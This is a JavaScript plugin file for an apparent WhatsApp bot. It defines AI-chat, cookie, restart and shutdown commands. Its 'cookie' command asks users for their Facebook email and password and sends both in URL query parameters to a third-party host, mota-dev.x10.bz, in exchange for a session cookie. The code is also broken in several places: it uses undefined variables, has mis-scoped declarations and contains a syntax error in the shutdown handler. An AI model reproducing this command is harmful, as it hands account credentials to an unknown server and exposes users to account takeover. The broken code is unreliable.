const { command, isPrivate } = require("../../lib");
const axios = require("axios");


command(
  {
    pattern: "Thabani",
    fromMe: isPrivate,
    desc: "Chat With Bot Admin AI",
    type: "ai",
  },

  async (message, match, m) => {
    const prompt = message.text;
    const uid = message.pushName || "4902638493";
    const missingMe = match || message.reply_message.text;
    if (!missingMe) {
      return message.reply("*_Whats New ?_*");
    }

    try {
      const dat = { prompt: prompt, uid: uid, name: uid }
      const response = await axios.get("https://mota-dev.x10.bz/thabani", {
        params: dat
      });

      if (response.data && response.data.reply) {
        message.reply(`${response.data.reply}`);
      } else {
        message.reply(`[»] Error: *${response.error || "Api Error Please Contact Z3R0SEC"}`);
      }
    } catch (error) {
      console.error("*Error Happened:*", error.message);
      message.reply(`*_X-RaaJ-K_*\n\n${error.message}`);
    }
  }
);


command(
  {
    pattern: "cookie",
    fromMe: isPrivate,
    desc: "GET Your FB AppState",
    type: "util",
  },
  async (message, match, m) => {
    const prompt = message.text;
    const uid = message.pushName || "4902638493";
    const missingHer = match || message.reply_message.text;
    if (!missingHer) {
      return message.reply("*_please Provide Your Facebook Email And Password In The Following Format:_*\n\n*_ThisIsASimpleEmail@gmail.com - ThisIsMyPassword_*");
    } else {
      const pss = missHer.split("-")[1]
      const ema = missHer.split("-")[0]
    }

    try {
      const dat = { e: ema, p: pss }
      const response = await axios.get("https://mota-dev.x10.bz/cookie", {
        params: dat
      });

      if (response.data && response.data.cookie) {
        message.reply(`${response.data.cookie}`);
      } else {
        message.reply(`[»] Error: *${response.data.error || "RaaJ Api Error Please Contact Z3R0SEC"}`);
      }
    } catch (error) {
      console.error("*Error Happened:*", error.message);
      message.reply(`*_X-RaaJ-K_*\n\n${error.message}`);
    }
  }
);


command(
  {
    pattern: "ai",
    fromMe: isPrivate,
    desc: "Chat With An Ai",
    type: "ai",
  },
  async (message, match, m) => {
    const prompt = message.text;
    const uid = message.pushName || "4902638493";
    const missingYou = match || message.reply_message.text;
    if (!missingYou) {
      return message.reply("*_Whats New ?_*");
    }

    try {
      const dat = { prompt: prompt, uid: uid }
      const response = await axios.get("https://mota-dev.x10.bz/lwandle", {
        params: dat
      });

      if (response.data && response.data.reply) {
        message.reply(`${response.data.reply}`);
      } else {
        message.reply(`[»] Error: *${response.error || "Api Error Please Contact Z3R0SEC"}`);
      }
    } catch (error) {
      console.error("*Error Happened:*", error.message);
      message.reply(`*_X-RaaJ-K_*\n\n${error.message}`);
    }
  }
);


command(
  {
    pattern: "restart",
    fromMe: true,
    type: "tools",
    desc: "Restart Bot",
  },
  async (message) => {
    await message.reply(`_Restarting..._`);
      await process.send("reset")
  }
);


command(
  {
    pattern: "shutdown",
    fromMe: true,
    type: "heroku",
    desc: "Dyno off",
    type: "heroku",
  },
  async (message) => {
      await message.reply(`_Shutting down!_`);
      await delay(1000).then(() =>  process.send("Kill")
  }
);
